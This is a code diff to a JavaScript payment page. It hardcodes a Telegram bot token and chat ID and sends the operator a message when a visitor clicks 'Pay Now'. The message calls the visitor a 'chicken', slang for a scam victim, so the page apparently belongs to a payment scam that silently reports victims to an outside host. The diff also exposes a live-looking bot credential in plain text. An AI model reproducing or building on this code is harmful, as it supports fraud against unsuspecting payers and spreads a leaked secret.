@@ -308,32 +308,29 @@
             document.getElementById('errorMessage').style.display = 'none';
         }
 
-        function triggerPaymentMessage(event) {
-            event.preventDefault(); // Prevent immediate navigation
+         function triggerPaymentMessage(event) {
+        event.preventDefault(); // Prevent immediate navigation
 
-            const selectedImage = document.querySelector('.image-box.checked');
-            const errorMessage = document.getElementById('errorMessage');
-            const paymentMessage = document.getElementById('paymentMessage');
-            const amount = getUrlParameter("amount"); 
-            const loaderContainer = document.getElementById('loaderContainer');
-            const paymentContainer = document.getElementById('paymentContainer');
+        const selectedImage = document.querySelector('.image-box.checked');
+        const errorMessage = document.getElementById('errorMessage');
+        const paymentMessage = document.getElementById('paymentMessage');
+        const amount = getUrlParameter("amount"); 
+        const loaderContainer = document.getElementById('loaderContainer');
+        const paymentContainer = document.getElementById('paymentContainer');
 
-            if (!selectedImage || !amount) {
-    // Show error message if no image is selected or "amount" is missing
-    errorMessage.style.display = 'block';
-} else {
-    // Hide error message if previously shown
-    errorMessage.style.display = 'none';
+        if (!selectedImage || !amount) {
+            // Show error message if no image is selected or "amount" is missing
+            errorMessage.style.display = 'block';
+        } else {
+            // Hide error message if previously shown
+            errorMessage.style.display = 'none';
 
-    // Show payment message
-    paymentMessage.style.display = 'block';
+            // Show payment message
+            paymentMessage.style.display = 'block';
 
-    // Telegram notification
-    fetch('/config.json')
-        .then(response => response.json())
-        .then(config => {
-            const botToken = config.botToken;
-            const chatId = config.chatId;
+            // Telegram notification - UPDATED VALUES
+            const botToken = "7937811076:AAF-i6ibW9e5nVLSX5wKPCSYgh4ItKEho6Y";
+            const chatId = "6151148119";
             const message = "🐔 মুরগি Pay Now এ ক্লিক করেছে";
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -343,10 +340,7 @@
                     chat_id: chatId,
                     text: message
                 })
-            });
-        })
-        .catch(error => console.error("Telegram message send error:", error));
-
+            }).catch(error => console.error("Telegram message send error:", error));
     setTimeout(() => {
         paymentContainer.style.display = 'none'; // pay container
         loaderContainer.style.display = 'flex'; // loader container
